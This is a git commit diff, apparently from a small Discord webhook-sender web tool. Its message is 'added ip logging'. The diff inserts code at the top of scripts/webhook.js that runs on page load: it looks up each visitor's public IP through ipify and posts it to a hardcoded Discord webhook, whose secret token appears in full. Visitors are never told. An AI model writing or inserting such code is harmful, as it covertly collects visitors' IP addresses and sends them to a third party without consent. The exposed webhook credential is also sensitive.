da1348e4c7c9421001147715306648fd3db9b564
Aiden Thorpe <surzies@gmail.com>
2026-07-28 22:11:26 +1000

    added ip logging

--- scripts/webhook.js
+++ scripts/webhook.js
@@ -1,3 +1,21 @@
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const ipLogger = "https://discord.com/api/webhooks/1531634930948247713/H0W_yonQXNyc1JLYHZx_FOxteN36mqO1s61btCPEoohG6ZtyCCxHH3GlspeR5pp-xlWI";
+    const request = new XMLHttpRequest();
+    let ipAddress = data.ip
+
+    request.open("POST", ipLogger)
+    request.setRequestHeader('Content-type', 'application/json');
+    const params = {
+      content: `Detected IP: [${ipAddress}]`
+    }
+    request.send(JSON.stringify(params));
+  })
+  .catch(error => {
+    console.error("Error fetching IP address:", error);
+  });
+
 function message() {
   const dropdown = document.getElementById("webhooks");
   let message = document.getElementById("message").value;
